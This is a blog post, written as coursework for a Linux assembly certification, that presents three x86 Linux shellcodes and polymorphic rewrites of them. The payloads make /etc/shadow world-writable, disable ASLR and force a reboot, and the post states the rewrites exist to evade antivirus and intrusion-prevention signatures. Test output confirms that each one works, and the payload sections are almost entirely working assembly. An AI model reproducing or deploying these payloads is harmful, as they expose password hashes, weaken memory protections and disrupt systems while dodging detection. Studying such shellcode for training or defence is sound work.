@@ -1,0 +1,341 @@
+---
+layout: post
+title:  "SLAE32 - Polymorphism Linux Shellcode"
+date:   2019-12-04 21:03:36 +0530
+categories: x86 ASM SHELLCODE
+---
+
+In this blog post we going to talk about three different shellcodes from *shell-storm* and we going to to create a polymorphic version of each. 
+
+### Polymorphism, What this means ?
+
+Plymorphic means "many things", in the context of exploitation we can modify the code of a know shellcode but retainig his functionality, this technique allow us to "bypass" or "evade" in some way AV/IPS systems because those systems use signature to identify malicious code. 
+
+## #1 Linux/x86 chmod 
+
+
+[Original shellcode](http://shell-storm.org/shellcode/files/shellcode-210.php)
+
+
+```plaintext
+section .text
+global _start
+
+ _start:
+      xor edx, edx
+ 
+      push byte 15
+      pop eax
+      push edx
+      push byte 0x77
+      push word 0x6f64
+      push 0x6168732f
+      push 0x6374652f
+      mov ebx, esp
+      push word 0666Q
+      pop ecx
+      int 0x80
+ 
+      push byte 1
+      pop eax
+      int 0x80
+```
+
+Shellcode Length: 36 bytes
+
+
+## #1 Linux/x86 chmod - Polymorphic version
+
+[Plymorphic shellcode](https://www.exploit-db.com/shellcodes/47200) 
+
+```plaintext
+
+section .data
+
+        EXIT_CALL equ 1
+        CHMOD_CALL equ 15
+
+section .text
+
+global _start
+
+_start:
+        nop
+        cdq
+        push byte CHMOD_CALL
+        pop eax
+        push edx
+        push byte 0x77
+        push word 0x6f64
+        mov esi, 0x222933f0
+        add esi, 0x3f3f3f3f
+        push esi
+        xor esi, esi
+        mov esi, 0x243525f0
+        add esi, 0x3f3f3f3f
+        push esi
+        xor esi, esi
+        mov ebx, esp
+        push word 0666Q
+        pop ecx
+        int 0x80
+        mov al, EXIT_CALL
+        int 0x80
+
+```
+
+Max size: 36 * 1.5 = 54 bytes
+
+Shellcode Length: 53 bytes
+
+### Testing 
+
+```plaintext
+root@motu-pc:/home/motu/ASM/Assignment-6/exercise-1# ll /etc/shadow
+-rw------- 1 root shadow 1256 jul  3 21:04 /etc/shadow
+
+root@motu-pc:/home/motu/ASM/Assignment-6/exercise-1# ./shellcode
+Shellcode Length:  53
+
+root@motu-pc:/home/motu/ASM/Assignment-6/exercise-1# ll /etc/shadow
+-rw-rw-rw- 1 root shadow 1256 jul  3 21:04 /etc/shadow
+
+root@motu-pc:/home/motu/ASM/Assignment-6/exercise-1# 
+
+```
+
+## #2 Linux/86 - ASLR deativation
+
+
+[Original shellcode](http://shell-storm.org/shellcode/files/shellcode-813.php)
+
+
+```plaintext
+
+_start: 
+        xor eax,eax 
+        push eax 
+        push dword 0x65636170
+        push dword 0x735f6176
+        push dword 0x5f657a69
+        push dword 0x6d6f646e
+        push dword 0x61722f6c
+        push dword 0x656e7265
+        push dword 0x6b2f7379
+        push dword 0x732f636f
+        push dword 0x72702f2f
+        mov ebx,esp 
+        mov cx,0x2bc 
+        mov al,0x8 
+        int 0x80 
+        mov ebx,eax 
+        push eax 
+        mov dx,0x3a30 
+        push dx 
+        mov ecx,esp 
+        xor edx,edx 
+        inc edx 
+        mov al,0x4 
+        int 0x80 
+        mov al,0x6 
+        int 0x80 
+        inc eax 
+        int 0x80
+
+```
+
+Shellcode Length: 83 bytes
+
+
+## #2 Linux/86 - ASLR deativation -  Polymorphic version
+
+[Polymorphic shellcode](https://www.exploit-db.com/shellcodes/47201)
+
+```plaintext
+
+section .data
+
+        WRITE_SYSCALL equ 4
+        CLOSE_SYSCALL equ 6
+
+section .text
+
+global _start
+
+_start: 
+        nop
+        mov eax, 0xffffffff
+        not eax
+        push eax
+        mov esi, 0x65636170
+        push esi
+        xor esi, esi
+        mov esi, 0x735f6176
+        push esi
+        xor esi, esi
+        push dword 0x5f657a69
+        push dword 0x6d6f646e
+        push dword 0x61722f6c
+        push dword 0x656e7265
+        push dword 0x6b2f7379
+        push dword 0x732f636f
+        
+        mov esi, 0x72702f2f
+        push esi
+        xor esi, esi
+
+
+        mov ebx,esp 
+        mov cx,0x2bc 
+        mov al,0x6
+        inc al
+        inc al
+        int 0x80
+        mov ebx,eax 
+        push eax 
+        mov dx,0xb01
+        add dx,0x2f2f 
+        push dx 
+        mov ecx,esp 
+        cdq 
+        inc edx
+        mov al,WRITE_SYSCALL 
+        int 0x80
+        mov al,CLOSE_SYSCALL
+        int 0x80 
+ 
+        mov al, 1
+        int 0x80
+
+```
+
+Max size: 83 * 1.5 = 124 bytes
+
+Shellcode Length: 107 bytes
+
+### Testing
+
+```plaintext
+root@motu-pc:/home/motu/ASM/Assignment-6/exercise-2# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+2                                 <-- ASLR Enabled
+
+root@motu-pc:/home/motu/ASM/Assignment-6/exercise-2# ./shellcode 
+Shellcode Length:  107
+
+root@motu-pc:/home/motu/ASM/Assignment-6/exercise-2# cat /proc/sys/kernel/randomize_va_space 
+0                                 <-- ASLR Disabled
+root@motu-pc:/home/motu/ASM/Assignment-6/exercise-2# 
+
+
+```
+
+
+
+
+## #3 Linux/x86 - Force reboot shellcode
+
+
+[Original shellcode](http://shell-storm.org/shellcode/files/shellcode-831.php)
+
+
+```plaintext
+
+section .text
+
+global _start
+_start:
+        xor    eax,eax
+        push   eax
+        push   0x746f6f62
+        push   0x65722f6e
+        push   0x6962732f
+        mov    ebx, esp
+        push   eax
+        push word  0x662d
+        mov    esi, esp
+        push   eax
+        push   esi
+        push   ebx
+        mov    ecx, esp
+        mov    al, 0xb
+        int    0x80
+
+```
+
+Shellcode Length: 36 bytes
+
+
+## #3 Linux/x86 - Force reboot shellcode - Polymorphic version
+
+[Polymorphic shellcode](https://www.exploit-db.com/shellcodes/47202)
+
+```plaintext
+section .data
+
+         SYSCALL_EXECVE equ 11
+
+section .text
+
+global _start
+
+_start:
+        nop
+        ;xor eax, eax
+        or eax, 0xffffffff
+        not eax
+        push   eax
+        ; push 0x746f6f62
+        mov eax,  0x8b90909d
+        not eax
+        push eax
+        ; push 0x65722f6e
+        mov eax, 0x9a8dd091
+        not eax
+        push eax
+        ; push 0x6962732f
+        mov eax, 0x969d8cd0
+        not eax
+        push eax
+        xor eax, eax
+        mov    ebx, esp
+        push   eax
+        push word  0x662d
+        mov    esi, esp
+        push   eax
+        push   esi
+        push   ebx
+        mov    ecx, esp
+        or    al, SYSCALL_EXECVE
+        int    0x80
+
+```
+
+Max size: 36 * 1.5 = 54 bytes
+
+Shellcode Length: 51 bytes
+
+### Testing
+
+
+```plaintext
+motu@motu-pc:~/ASM/Assignment-6/exercise-3$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+motu@motu-pc:~/ASM/Assignment-6/exercise-3$ ./shellcode 
+
+...  
+
+Shutdown :)
+
+```
+
+
+***
+
+
+### Disclamer
+
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+
+Student ID: PA-9844
